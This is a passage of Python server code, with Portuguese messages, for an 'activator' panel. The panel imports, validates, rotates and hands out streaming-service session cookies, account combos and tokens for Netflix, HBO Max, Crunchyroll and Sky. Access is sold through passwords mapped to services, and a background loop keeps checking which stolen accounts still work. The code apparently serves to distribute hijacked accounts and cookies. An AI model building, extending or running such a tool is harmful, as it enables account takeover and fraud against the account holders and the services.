                                save_cookie_content(svc, f"import_batch_{timestamp}_{sub_idx + 1}.json", sub_content)
                        else:
                            save_cookie_content(svc, f"import_json_{timestamp}.json", raw_text)
                    except Exception:
                        save_cookie_content(svc, f"import_raw_{timestamp}.txt", raw_text)
                else:
                    raw_chunks = split_multiple_raw_cookies(raw_text)
                    for b_idx, chunk in enumerate(raw_chunks):
                        chunk = chunk.strip()
                        if chunk:
                            save_cookie_content(svc, f"batch_cookie_{timestamp}_{b_idx + 1}.txt", chunk)

        total_saved = saved_netflix + saved_hbo + saved_crunchyroll + saved_sky
        if total_saved > 0:
            global SERVER_DATA_VERSION
            SERVER_DATA_VERSION = time.time()
            sync_cookies_bundle()
            COOKIE_FAIL_COUNTS.clear()
            
            # Limpa caches em memória para recarregar o novo estoque instantaneamente
            with VALID_NETFLIX_LOCK:
                VALID_NETFLIX_BY_FILE.clear()
                VALID_NETFLIX_POOL.clear()
            with VALID_HBO_LOCK:
                VALID_HBO_BY_FILE.clear()
                VALID_HBO_POOL.clear()
            with VALID_CRUNCHYROLL_LOCK:
                VALID_CRUNCHYROLL_BY_EMAIL.clear()
                VALID_CRUNCHYROLL_POOL.clear()

            if saved_sky:
                CURRENT_SKY_READY = find_sky_valid_account()
            elif saved_netflix:
                CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
            elif saved_crunchyroll:
                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
            else:
                CURRENT_HBO_READY = find_hbo_valid_cookie()

            return self.send_json_response({
                "success": True,
                "saved_count": total_saved,
                "saved_netflix": saved_netflix,
                "saved_hbo": saved_hbo,
                "saved_crunchyroll": saved_crunchyroll,
                "saved_sky": saved_sky,
                "server_version": SERVER_DATA_VERSION,
                "message": f"🎉 {total_saved} conta(s)/cookie(s) importado(s) com sucesso! ({saved_netflix} Netflix, {saved_hbo} HBO Max, {saved_crunchyroll} Crunchyroll, {saved_sky} Sky)"
            })
        else:
            return self.send_json_response({"success": False, "message": "Nenhum arquivo ou texto válido enviado."}, 400)

    def _prewarm_after_upload(self, service: str):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        time.sleep(0.3)
        if service == 'netflix':
            CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
        elif service == 'crunchyroll':
            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
        elif service == 'sky':
            CURRENT_SKY_READY = find_sky_valid_account()
        else:
            CURRENT_HBO_READY = find_hbo_valid_cookie()

    def handle_api_reset_cache(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY, DEAD_NETFLIX_COOKIES, USED_NETFLIX_COOKIES, USED_HBO_COOKIES, DEAD_CRUNCHYROLL_ACCOUNTS, USED_CRUNCHYROLL_ACCOUNTS, DEAD_SKY_ACCOUNTS, USED_SKY_ACCOUNTS, SERVER_DATA_VERSION
        DEAD_NETFLIX_COOKIES.clear()
        COOKIE_FAIL_COUNTS.clear()
        tv2.USED_COOKIES.clear()
        USED_HBO_COOKIES.clear()
        DEAD_CRUNCHYROLL_ACCOUNTS.clear()
        USED_CRUNCHYROLL_ACCOUNTS.clear()
        DEAD_SKY_ACCOUNTS.clear()
        USED_SKY_ACCOUNTS.clear()
        SERVER_DATA_VERSION = time.time()
        CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
        CURRENT_HBO_READY = find_hbo_valid_cookie()
        CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
        CURRENT_SKY_READY = find_sky_valid_account()
        return self.send_json_response({
            "success": True,
            "server_version": SERVER_DATA_VERSION,
            "message": "Cache de cookies, combos e contas Sky reinicializado! Todas as contas estão disponíveis para re-teste."
        })

    def handle_api_get_sky_tokens(self):
        try:
            tokens_data = sky_service.get_tokens_status()
            return self.send_json_response({"success": True, "tokens": tokens_data})
        except Exception as e:
            return self.send_json_response({"success": False, "message": str(e)}, 500)

    def handle_api_save_sky_tokens(self):
        global CURRENT_SKY_READY, SERVER_DATA_VERSION
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        sso_token = req.get('sso_token', '').strip()
        profile_token = req.get('profile_token', '').strip()

        saved_any = False
        if sso_token:
            if sky_service.save_sso_token(sso_token):
                saved_any = True
        if profile_token:
            if sky_service.save_profile_token(profile_token):
                saved_any = True

        if saved_any:
            try:
                import ativador_tv
                ativador_tv.reload_tokens()
            except Exception:
                pass
            DEAD_SKY_ACCOUNTS.clear()
            USED_SKY_ACCOUNTS.clear()
            SERVER_DATA_VERSION = time.time()
            CURRENT_SKY_READY = find_sky_valid_account()
            tokens_data = sky_service.get_tokens_status()
            return self.send_json_response({
                "success": True,
                "message": "⚡ Tokens da Sky atualizados com sucesso!",
                "tokens": tokens_data,
                "server_version": SERVER_DATA_VERSION
            })
        else:
            return self.send_json_response({"success": False, "message": "Informe ao menos o SSO Token ou Profile Token válido."}, 400)

    def handle_api_admin_stats(self):
        all_nf = get_all_netflix_accounts()
        all_hbo = get_all_hbo_accounts()
        all_cr = get_all_crunchyroll_accounts()
        all_sky = get_all_sky_accounts()
        verified_nf = [a for a in all_nf if a.get("validated")]
        verified_hbo = [a for a in all_hbo if a.get("validated")]
        verified_cr = [a for a in all_cr if a.get("validated")]
        verified_sky = [a for a in all_sky if a.get("validated")]
        return self.send_json_response({
            "netflix_total": len(all_nf),
            "netflix_verified": len(verified_nf),
            "netflix_dead": len(DEAD_NETFLIX_COOKIES),
            "hbo_total": len(all_hbo),
            "hbo_verified": len(verified_hbo),
            "hbo_dead": len(USED_HBO_COOKIES),
            "crunchyroll_total": len(all_cr),
            "crunchyroll_verified": len(verified_cr),
            "crunchyroll_dead": len(DEAD_CRUNCHYROLL_ACCOUNTS),
            "sky_total": len(all_sky),
            "sky_verified": len(verified_sky),
            "sky_dead": len(DEAD_SKY_ACCOUNTS),
            "keep_alive": True,
            "timestamp": time.time()
        })

    def handle_api_admin_list_accounts(self):
        query_service = 'netflix'
        if 'service=hbo' in self.path or 'service=hbomax' in self.path:
            query_service = 'hbo'
        elif 'service=crunchyroll' in self.path:
            query_service = 'crunchyroll'
        elif 'service=sky' in self.path:
            query_service = 'sky'

        items = []
        if query_service == 'netflix':
            all_nf = get_all_netflix_accounts()
            for idx, entry in enumerate(all_nf):
                fpath = entry.get("file", "")
                bname = os.path.basename(fpath) if fpath else f"netflix_{idx+1}.txt"
                acc = entry.get("info", {})
                is_ready = bool(CURRENT_NETFLIX_READY and CURRENT_NETFLIX_READY.get("file") == fpath)
                items.append({
                    "id": bname,
                    "filename": bname,
                    "email": acc.get("email") or bname,
                    "plan": acc.get("plan") or "Netflix VIP",
                    "country": acc.get("country", "BR"),
                    "category": acc.get("category", "PADRÃO"),
                    "is_ready": is_ready
                })
        elif query_service == 'hbo':
            all_hbo = get_all_hbo_accounts()
            for idx, entry in enumerate(all_hbo):
                fpath = entry.get("file", "")
                bname = os.path.basename(fpath) if fpath else f"hbo_{idx+1}.txt"
                acc = entry.get("info", {})
                is_ready = bool(CURRENT_HBO_READY and CURRENT_HBO_READY.get("file") == fpath)
                items.append({
                    "id": bname,
                    "filename": bname,
                    "email": acc.get("email") or bname,
                    "plan": acc.get("plan") or "HBO Max VIP",
                    "country": acc.get("country", "BR"),
                    "region": acc.get("region", "LATAM"),
                    "is_ready": is_ready
                })
        elif query_service == 'crunchyroll':
            all_cr = get_all_crunchyroll_accounts()
            for idx, entry in enumerate(all_cr):
                email = entry.get("email") or entry.get("info", {}).get("email", f"cr_{idx+1}")
                acc = entry.get("info", {})
                is_ready = bool(CURRENT_CRUNCHYROLL_READY and CURRENT_CRUNCHYROLL_READY.get("email") == email)
                items.append({
                    "id": email,
                    "filename": entry.get("file", "contas_crunchyroll.txt"),
                    "email": email,
                    "plan": acc.get("plan") or "Crunchyroll Mega Fan",
                    "country": acc.get("country", "BR"),
                    "is_ready": is_ready
                })
        elif query_service == 'sky':
            all_sky = get_all_sky_accounts()
            for idx, entry in enumerate(all_sky):
                acc = entry.get("info", {})
                email = acc.get("email") or entry.get("email") or f"sky_{idx+1}"
                is_ready = bool(CURRENT_SKY_READY and CURRENT_SKY_READY.get("email") == email)
                items.append({
                    "id": email,
                    "filename": entry.get("file", "skycontas.txt"),
                    "email": email,
                    "plan": acc.get("plan") or "Sky TV VIP",
                    "country": acc.get("country", "BR"),
                    "client_name": acc.get("client_name", ""),
                    "is_ready": is_ready
                })

        return self.send_json_response({
            "success": True,
            "service": query_service,
            "total": len(items),
            "accounts": items
        })

    def handle_api_admin_delete_account(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, CURRENT_SKY_READY
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        service = req.get("service", "netflix").lower()
        target_id = req.get("id", "").strip() or req.get("filename", "").strip() or req.get("email", "").strip()

        if not target_id:
            return self.send_json_response({"success": False, "message": "Identificador da conta ausente."}, 400)

        deleted = False

        if service in ["netflix", "nf"]:
            for fold in [NETFLIX_COOKIES_FOLDER, os.path.join(BASE_DIR, "cookies")]:
                if os.path.exists(fold):
                    for f in glob.glob(os.path.join(fold, "*")):
                        if os.path.basename(f) == target_id or target_id in os.path.basename(f):
                            try:
                                os.remove(f)
                                deleted = True
                            except Exception:
                                pass
                            VALID_NETFLIX_BY_FILE.pop(f, None)
                            tv2.DEAD_COOKIES.discard(f)
                            DEAD_NETFLIX_COOKIES.discard(f)
            CURRENT_NETFLIX_READY = find_netflix_valid_cookie()

        elif service in ["hbo", "hbomax", "max"]:
            for fold in [HBO_COOKIES_FOLDER, os.path.join(BASE_DIR, "cookies 01")]:
                if os.path.exists(fold):
                    for f in glob.glob(os.path.join(fold, "*")):
                        if os.path.basename(f) == target_id or target_id in os.path.basename(f):
                            try:
                                os.remove(f)
                                deleted = True
                            except Exception:
                                pass
                            VALID_HBO_BY_FILE.pop(f, None)
                            DEAD_HBO_COOKIES.discard(f)
                            USED_HBO_COOKIES.discard(f)
            CURRENT_HBO_READY = find_hbo_valid_cookie()

        elif service in ["crunchyroll", "cr"]:
            if os.path.exists(CRUNCHYROLL_COMBO_FOLDER):
                for f in glob.glob(os.path.join(CRUNCHYROLL_COMBO_FOLDER, "*.txt")):
                    try:
                        with open(f, "r", encoding="utf-8", errors="ignore") as in_f:
                            lines = in_f.readlines()
                        new_lines = [l for l in lines if target_id.lower() not in l.lower()]
                        if len(new_lines) != len(lines):
                            with open(f, "w", encoding="utf-8") as out_f:
                                out_f.writelines(new_lines)
                            deleted = True
                    except Exception:
                        pass
            DEAD_CRUNCHYROLL_ACCOUNTS.discard(target_id)
            USED_CRUNCHYROLL_ACCOUNTS.discard(target_id)
            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()

        elif service in ["sky", "skymais"]:
            deleted = sky_service.remove_sky_account(target_id)
            DEAD_SKY_ACCOUNTS.discard(target_id)
            USED_SKY_ACCOUNTS.discard(target_id)
            CURRENT_SKY_READY = find_sky_valid_account()

        try:
            sync_cookies_bundle()
        except Exception:
            pass

        if deleted:
            return self.send_json_response({
                "success": True,
                "message": f"Conta / Cookie '{target_id}' removido com sucesso!"
            })
        else:
            return self.send_json_response({
                "success": False,
                "message": f"Não foi possível localizar o arquivo ou conta '{target_id}' para exclusão."
            }, 404)

    def handle_api_get_online_users(self):
        data = get_online_users_data()
        self.send_json_response({"success": True, "data": data})

    def handle_api_get_passwords(self):
        keys = load_access_keys()
        self.send_json_response({"success": True, "passwords": keys})

    def handle_api_generate_password(self):
        new_pwd = generate_strong_cyber_password()
        self.send_json_response({"success": True, "password": new_pwd})

    def handle_api_save_password(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        senha = req.get("senha", "").strip()
        nome = req.get("nome", "").strip()
        servicos = req.get("servicos", [])
        descricao = req.get("descricao", "").strip()

        if not senha:
            return self.send_json_response({"success": False, "message": "A senha não pode estar em branco."}, 400)

        if not isinstance(servicos, list) or len(servicos) == 0:
            return self.send_json_response({"success": False, "message": "Selecione ao menos 1 serviço para a senha liberar."}, 400)

        valid_services = [s for s in servicos if s in ["netflix", "hbo", "crunchyroll", "sky"]]
        if not valid_services:
            return self.send_json_response({"success": False, "message": "Serviços selecionados inválidos."}, 400)

        if not nome:
            svc_names = [s.upper() for s in valid_services]
            nome = f"Perfil {' + '.join(svc_names)}"

        keys = load_access_keys()
        found = False
        for idx, k in enumerate(keys):
            if k.get("senha", "").strip() == senha:
                keys[idx] = {
                    "senha": senha,
                    "nome": nome,
                    "servicos": valid_services,
                    "descricao": descricao or f"Libera: {', '.join(valid_services)}"
                }
                found = True
                break
        
        if not found:
            keys.insert(0, {
                "senha": senha,
                "nome": nome,
                "servicos": valid_services,
                "descricao": descricao or f"Libera: {', '.join(valid_services)}"
            })

        try:
            with open(CONFIG_SENHAS_FILE, "w", encoding="utf-8") as f:
                json.dump({"senhas": keys}, f, indent=2, ensure_ascii=False)
            sync_passwords_text_file(keys)
            return self.send_json_response({
                "success": True,
                "message": f"Senha '{nome}' salva com sucesso!",
                "passwords": keys
            })
        except Exception as e:
            return self.send_json_response({"success": False, "message": f"Erro ao salvar: {str(e)}"}, 500)

    def handle_api_delete_password(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8')) if post_data else {}
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        senha = str(req.get("senha", "") or req.get("password", "")).strip()
        raw_idx = req.get("index")

        keys = load_access_keys()
        target_idx = -1
        target_item = None

        # 1. Tenta encontrar pelo índice da lista enviado pelo frontend
        if raw_idx is not None:
            try:
                idx = int(raw_idx)
                if 0 <= idx < len(keys):
                    target_idx = idx
                    target_item = keys[idx]
            except Exception:
                pass

        # 2. Se não encontrou por índice, busca pela string da senha com comparação segura e flexível
        if target_idx == -1 and senha:
            for idx, k in enumerate(keys):
                k_pwd = str(k.get("senha", "")).strip()
                if secure_str_compare(k_pwd, senha) or k_pwd == senha or k_pwd.lower() == senha.lower():
                    target_idx = idx
                    target_item = k
                    break

        if target_idx == -1 or target_item is None:
            return self.send_json_response({"success": False, "message": "Senha não encontrada no sistema para exclusão."}, 404)

        deleted_pwd = str(target_item.get("senha", "")).strip()
        keys.pop(target_idx)

        try:
            with open(CONFIG_SENHAS_FILE, "w", encoding="utf-8") as f:
                json.dump({"senhas": keys}, f, indent=2, ensure_ascii=False)
            sync_passwords_text_file(keys)

            # Invalida e desconecta imediatamente qualquer usuário ou celular que estava usando esta senha
            # MAS preserva a sessão atual do administrador para que o painel nunca seja desconectado
            admin_tok = self.get_auth_token_str()
            with LOGIN_LOCK:
                if admin_tok:
                    ACTIVE_ADMIN_SESSIONS[admin_tok] = time.time() + 43200
                to_purge = [
                    t for t, s in ACTIVE_SESSIONS.items()
                    if t != admin_tok and secure_str_compare(str(s.get("password", "")).strip(), deleted_pwd)
                ]
                for t in to_purge:
                    ACTIVE_SESSIONS.pop(t, None)
                save_active_sessions()

            return self.send_json_response({
                "success": True,
                "message": f"Senha '{deleted_pwd}' removida com sucesso. Dispositivos desconectados.",
                "passwords": keys
            })
        except Exception as e:
            return self.send_json_response({"success": False, "message": f"Erro ao excluir: {str(e)}"}, 500)


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

def background_verifier_loop():
    while True:
        try:
            get_verified_netflix_cookies(min_count=8)
            get_verified_hbo_cookies(min_count=4)
            get_verified_crunchyroll_accounts(min_count=2)
            get_all_sky_accounts()
        except Exception:
            pass
        time.sleep(12)

def keep_alive_worker():
    """Anti-Sleep 24h: Mantém a instância do Render 100% acordada e instantânea."""
    time.sleep(15) # Espera o servidor iniciar
    while True:
        try:
            # 1. Ping interno local
            requests.get(f"http://127.0.0.1:{PORT}/api/ping", timeout=4)
        except Exception:
            pass

        try:
            # 2. Ping externo se estiver na nuvem Render
            render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://tvcodigo-1.onrender.com")
            if render_url:
                target = f"{render_url.rstrip('/')}/api/ping"
                requests.get(target, timeout=8)
        except Exception:
            pass

        time.sleep(300) # Ping a cada 5 minutos

def start_background_scanner():
    t1 = threading.Thread(target=background_verifier_loop, daemon=True)
    t1.start()
    t2 = threading.Thread(target=keep_alive_worker, daemon=True)
    t2.start()

def run_server(port=PORT):
    os.chdir(BASE_DIR)
    local_ip = get_local_ip()
    start_background_scanner()
    with ThreadedTCPServer(("", port), AppRequestHandler) as httpd:
        print(f"\n=======================================================")
        print(f" 🚀 ATIVADOR NETFLIX, HBO MAX, CRUNCHYROLL & SKY+ INICIADO COM SUCESSO!")
        print(f" ⚡ Anti-Sleep 24h: ATIVADO (Render sempre acordado)")
        print(f" 💻 Acesse no PC:      http://localhost:{port}")
        print(f" 📱 Acesse no Celular: http://{local_ip}:{port}  (no mesmo Wi-Fi)")
        print(f"=======================================================\n")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nServidor finalizado pelo usuário.")

if __name__ == "__main__":
    run_server()
